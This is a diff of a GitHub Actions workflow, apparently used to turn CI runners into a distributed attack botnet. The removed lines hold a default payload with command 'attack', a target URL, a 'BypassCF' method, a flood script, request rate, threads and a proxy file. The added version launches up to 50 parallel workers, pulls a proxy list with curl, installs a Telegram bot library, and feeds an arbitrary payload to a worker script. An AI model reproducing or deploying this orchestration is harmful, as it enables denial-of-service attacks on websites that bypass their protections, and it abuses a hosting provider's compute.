@@ -1,89 +1,53 @@
-name: ga-worker
-
+name: GitHub Actions Worker
 on:
   workflow_dispatch:
     inputs:
       count:
-        description: "Số worker (matrix)"
+        description: 'Number of workers'
         required: true
-        default: "5"
+        default: '50'
       minutes:
-        description: "Mỗi worker chạy bao lâu (phút)"
+        description: 'Run duration in minutes'
         required: true
-        default: "2"
+        default: '2'
       parallel:
-        description: "Số job chạy đồng thời"
+        description: 'Number of parallel jobs'
         required: true
-        default: "5"
+        default: '50'
       payload:
-        description: "JSON lệnh cho worker (vd attack/fetch/...)"
+        description: 'Payload for worker'
         required: true
-        default: '{"cmd":"attack","args":{"target":"https://example.com","duration":60,"method":"BypassCF","script":"cfhieu.js","rate":"16","thread":"3","proxyfile":"proxy.txt"}}'
 
 jobs:
-  make-matrix:
-    runs-on: ubuntu-latest
-    outputs:
-      matrix: ${{ steps.set.outputs.matrix }}
-    steps:
-      - id: set
-        shell: bash
-        run: |
-          n=${{ inputs.count }}
-          printf 'matrix={"idx":[' > "$GITHUB_OUTPUT"
-          for i in $(seq 1 "$n"); do
-            if [ "$i" -gt 1 ]; then printf ',' >> "$GITHUB_OUTPUT"; fi
-            printf '%s' "$i" >> "$GITHUB_OUTPUT"
-          done
-          printf ']}\n' >> "$GITHUB_OUTPUT"
-
-  run-workers:
-    needs: make-matrix
+  worker:
     runs-on: ubuntu-latest
     strategy:
-      fail-fast: false
-      max-parallel: ${{ fromJSON(inputs.parallel) }}
-      matrix: ${{ fromJSON(needs.make-matrix.outputs.matrix) }}
-
+      matrix:
+        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
+      max-parallel: ${{ inputs.parallel }}
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout repository
+        uses: actions/checkout@v3
 
-      - uses: actions/setup-python@v5
+      - name: Set up Python
+        uses: actions/setup-python@v4
         with:
-          python-version: '3.11'
-
-      - uses: actions/setup-node@v3
-        with:
-          node-version: '16'
+          python-version: '3.9'
 
       - name: Install dependencies
         run: |
-          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
-          npm install
+          python -m pip install --upgrade pip
+          pip install pyTelegramBotAPI psutil requests
 
-      - name: Debug environment
+      - name: Download proxy file
         run: |
-          echo "Working directory: $(pwd)"
-          echo "Payload JSON: ${{ inputs.payload }}"
-          ls -la
+          curl -o proxy.txt ${{ secrets.PROXY_SOURCE_URL || 'https://example.com/proxy.txt' }}
+          echo "Downloaded proxy.txt"
 
-      - name: Create payload file and run worker #${{ matrix.idx }}
+      - name: Run worker
         env:
-          WORKER_ID: ${{ matrix.idx }}
-          PAYLOAD_JSON: ${{ inputs.payload }}
-          FORCE_GA: "1"
+          PAYLOAD: ${{ inputs.payload }}
+          WORKER_ID: ${{ matrix.worker_id }}
         run: |
-          echo "START worker #${{ matrix.idx }}"
-          echo "Payload received: $PAYLOAD_JSON"
-          # Tạo file payload.json với quyền ghi rõ ràng
-          echo "$PAYLOAD_JSON" | tee payload.json
-          chmod +rwx payload.json
-          # Kiểm tra file
-          if [ ! -f payload.json ]; then
-            echo "Error: payload.json not created!"
-            exit 1
-          fi
-          # Chạy worker
-          python3 vps_worker.py --payload payload.json
-          sleep $(( ${{ inputs.minutes }} * 60 ))
-          echo "END worker #${{ matrix.idx }}"
+          python vps_worker.py "$PAYLOAD" --worker-id $WORKER_ID
+        timeout-minutes: ${{ inputs.minutes }}
